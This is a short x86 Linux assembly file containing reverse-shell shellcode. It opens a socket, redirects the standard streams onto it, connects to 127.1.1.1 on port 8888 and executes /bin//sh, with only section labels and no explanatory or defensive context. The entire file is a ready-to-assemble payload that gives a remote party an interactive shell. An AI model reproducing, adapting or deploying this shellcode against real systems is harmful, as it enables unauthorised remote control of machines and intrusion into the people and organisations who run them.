global _start
section	.text
_start:
;=====================SOCK SETUP==========
xor ebx,ebx
push ebx
inc ebx
push ebx
push 0x2
mov ecx, esp
push 0x66
pop eax
int 0x80
;=======================DUP2===============
xchg ebx,eax
pop ecx
loop:
	mov al,0x3f
	int 0x80
	dec ecx
	jns loop

;======================= CONNECT============
push 0x101017f
push word 0xb822
push word 2
mov ecx,esp
mov al,0x66
push eax
push ecx
push ebx
mov bl,0x3
mov ecx,esp
int 0x80

;======================= EXECVE=============
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
push edx
push ebx
mov ecx,esp
mov al,0xb
int 0x80
